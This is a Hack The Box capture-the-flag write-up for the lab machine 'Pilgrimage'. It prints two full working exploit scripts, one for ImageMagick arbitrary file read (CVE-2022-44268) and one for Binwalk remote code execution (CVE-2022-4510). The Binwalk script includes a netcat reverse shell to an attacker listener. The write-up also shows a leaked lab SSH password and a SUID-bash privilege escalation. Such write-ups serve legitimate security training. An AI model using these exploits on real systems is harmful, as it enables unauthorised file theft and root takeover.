---
layout: single
title: Pilgrimage  - Hack The Box
excerpt: "Pilgrimage is an easy-difficulty Linux machine featuring a web application with an exposed 'Git' repository. Analysing the underlying filesystem and source code reveals the use of a vulnerable version of 'ImageMagick', which can be used to read arbitrary files on the target by embedding a malicious 'tEXT' chunk into a PNG image. The vulnerability is leveraged to obtain a 'SQLite' database file containing a plaintext password that can be used to SSH into the machine. Enumeration of the running processes reveals a 'Bash' script executed by 'root' that calls a vulnerable version of the 'Binwalk' binary. By creating another malicious PNG, 'CVE-2022-4510' is leveraged to obtain Remote Code Execution (RCE) as 'root'."
date: 2025-06-02
classes: wide
header:
  teaser: /img2/pilgrimage.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - Web Enumeration
  - File Upload Enumeration
  - Abusing .git - Git-Dumper (Information Leakage)
  - ImageMagick 7.1.0-40 beta Exploitation (Arbitrary File Read) [CVE-2022-44268]
  - SQLite Database File Enumeration via CVE-2022-44268
  - Abusing an Active Service through a Script that is Run by Root
  - Binwalk 2.3.2 Exploitation - CVE-2022-4510 (RCE) [Privilege Escalation]
---


## Reconnaissance

- Nmap

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.11.219
```

![](/img2/Pasted%20image%2020250602125908.png)

- Add domain to local DNS

```bash
echo "10.10.11.219 pilgrimage.htb" >> /etc/hosts
```

- Dirsearch

```bash
dirsearch -u http://pilgrimage.htb/
```

![](/img2/Pasted%20image%2020250602132152.png)

> Github repository found


- Git-Dumper

https://github.com/arthaud/git-dumper

```bash
git-dumper http://pilgrimage.htb/.git/ pilrepo
```

- Check index.php code

![](/img2/Pasted%20image%2020250602135614.png)

![](/img2/Pasted%20image%2020250602135653.png)

## Exploitation

- ImageMagick 7.1.0-40 beta Exploitation (Arbitrary File Read) (CVE-2022-44268)

```python
#!/usr/bin/env python3
import sys
import png
import zlib
import argparse
import binascii
import logging

logging.basicConfig(stream=sys.stderr, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
d = zlib.decompressobj()
e = zlib.compressobj()
IHDR = b'\x00\x00\x00\n\x00\x00\x00\n\x08\x02\x00\x00\x00'
IDAT = b'x\x9c\xbd\xcc\xa1\x11\xc0 \x0cF\xe1\xb4\x03D\x91\x8b`\xffm\x98\x010\x89\x01\xc5\x00\xfc\xb8\n\x8eV\xf6\xd9' \
       b'\xef\xee])%z\xef\xfe\xb0\x9f\xb8\xf7^J!\xa2Zkkm\xe7\x10\x02\x80\x9c\xf3\x9cSD\x0esU\x1dc\xa8\xeaa\x0e\xc0' \
       b'\xccb\x8cf\x06`gwgf\x11afw\x7fx\x01^K+F'


def parse_data(data: bytes) -> str:
    _, data = data.strip().split(b'\n', 1)
    return binascii.unhexlify(data.replace(b'\n', b'')).decode()


def read(filename: str):
    if not filename:
        logging.error('you must specify a input filename')
        return

    res = ''
    p = png.Reader(filename=filename)
    for k, v in p.chunks():
        logging.info("chunk %s found, value = %r", k.decode(), v)
        if k == b'zTXt':
            name, data = v.split(b'\x00', 1)
            res = parse_data(d.decompress(data[1:]))

    if res:
        sys.stdout.write(res)
        sys.stdout.flush()


def write(from_filename, to_filename, read_filename):
    if not to_filename:
        logging.error('you must specify a output filename')
        return

    with open(to_filename, 'wb') as f:
        f.write(png.signature)
        if from_filename:
            p = png.Reader(filename=from_filename)
            for k, v in p.chunks():
                if k != b'IEND':
                    png.write_chunk(f, k, v)
        else:
            png.write_chunk(f, b'IHDR', IHDR)
            png.write_chunk(f, b'IDAT', IDAT)

        png.write_chunk(f, b"tEXt", b"profile\x00" + read_filename.encode())
        png.write_chunk(f, b'IEND', b'')


def main():
    parser = argparse.ArgumentParser(description='POC for CVE-2022-44268')
    parser.add_argument('action', type=str, choices=('generate', 'parse'))
    parser.add_argument('-i', '--input', type=str, help='input filename')
    parser.add_argument('-o', '--output', type=str, help='output filename')
    parser.add_argument('-r', '--read', type=str, help='target file to read', default='/etc/passwd')
    args = parser.parse_args()
    if args.action == 'generate':
        write(args.input, args.output, args.read)
    elif args.action == 'parse':
        read(args.input)
    else:
        logging.error("bad action")


if __name__ == '__main__':
    main()
```

```bash
python3 exploit.py generate -o poc.png -r /etc/passwd
```

![](/img2/Pasted%20image%2020250602145031.png)

![](/img2/Pasted%20image%2020250602145127.png)

```bash
python3 exploit.py parse -i out.png
```

![](/img2/Pasted%20image%2020250602145242.png)

- Get sqlite file

```bash
cat index.php | grep db
```

![](/img2/Pasted%20image%2020250602174227.png)

```bash
python3 exploit.py generate -o poc.png -r /var/db/pilgrimage
```

![](/img2/Pasted%20image%2020250602174312.png)

![](/img2/Pasted%20image%2020250602174342.png)

```bash
identify -verbose out.png | grep -Pv "^( |Image)" | xxd -r -p > db.sqlite
```

```bash
sqlite3 db.sqlite
```

![](/img2/Pasted%20image%2020250602175829.png)

- Connect to ssh

```bash
ssh emily@10.10.11.219
```

> abigchonkyboi123

## Post-exploitation

- Check actual process

```bash
ps -aux | grep root
```

![](/img2/Pasted%20image%2020250602204826.png)

> Root user are executing a bash command, let's check it.

- Check malwarescan.sh

```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

> This script detects if /var/www/pilgrimage.htb/shrunk/ has new png files. If new file detected the script exec binwalk to analyze the image.

-  Binwalk 2.3.2 Exploitation - CVE-2022-4510 (RCE)

```bash
cd /var/www/pilgrimage.htb/shrunk
```

```python
import argparse
import sys


class ExploitGenerator:
    def __init__(self, args):
        self.args = args

    def generate_exploit(self):
        if self.args.option == "ssh":
            header = bytes.fromhex(
                "5046532f302e390000000000000001002e2e2f2e2e2f2e2e2f2e7373682f617574686f72697a65645f6b657973000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034120000a0000000c100002e")
            with open(self.args.pub, "r") as pub_file:
                lines = pub_file.readlines()
        elif self.args.option in ["reverse", "command"]:
            if self.args.option == "reverse":
                command = f"nc {self.args.ip} {self.args.port} -e /bin/bash 2>/dev/null &"
            elif self.args.option == "command":
                if not self.args.command:
                    print("Please provide a command using --command option.")
                command = self.args.command
            header = bytes.fromhex("5046532f302e390000000000000001002e2e2f2e2e2f2e2e2f2e636f6e6669672f62696e77616c6b2f706c7567696e732f62696e77616c6b2e70790000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034120000a0000000c100002e")
            lines = [
                "import binwalk.core.plugin\n",
                "import os\n",
                "import shutil\n",
                "class MaliciousExtractor(binwalk.core.plugin.Plugin):\n",
                "    def init(self):\n",
                "        if not os.path.exists('/tmp/.binwalk'):\n",
                f'            os.system("{command}")\n',
                "            with open('/tmp/.binwalk', 'w') as temp_file:\n",
                "                temp_file.write('1')\n",
                "        else:\n",
                "            os.remove('/tmp/.binwalk')\n",
                "            os.remove(os.path.abspath(__file__))\n",
                "            shutil.rmtree(os.path.join(os.path.dirname(os.path.abspath(__file__)), '__pycache__'))\n"
            ]

        with open(self.args.file, "rb") as input_file:
            data = input_file.read()

        content = '\n'.join(lines).encode()

        with open("binwalk_exploit.png", "wb") as output_file:
            output_file.write(data)
            output_file.write(header)
            output_file.write(content)


def main():
    parser = argparse.ArgumentParser()

    subparsers = parser.add_subparsers(dest="option")

    ssh_parser = subparsers.add_parser("ssh")
    ssh_parser.add_argument("file", help="Path to input .png file")
    ssh_parser.add_argument("pub", help="Path to pub key file")

    command_parser = subparsers.add_parser("command")
    command_parser.add_argument("--command", help="Command to execute")
    command_parser.add_argument("file", help="Path to input .png file")

    reverse_parser = subparsers.add_parser("reverse")
    reverse_parser.add_argument("file", help="Path to input .png file")
    reverse_parser.add_argument("ip", help="IP to nc listener")
    reverse_parser.add_argument("port", help="Port to nc listener")

    args = parser.parse_args()

    if len(sys.argv) == 1:
        parser.print_help()
    else:
        generator = ExploitGenerator(args)
        generator.generate_exploit()


if __name__ == "__main__":
    main()
```

```bash
python3 exploit.py command 683df150b84c2.png --command "chmod u+s /bin/bash"
```

```bash
ls
```

![](/img2/Pasted%20image%2020250602205316.png)

> The exploit generate malicious png file with RCE, so binwalk will be executed by root user.

```bash
bash -p
```


![](/img2/Pasted%20image%2020250602204640.png)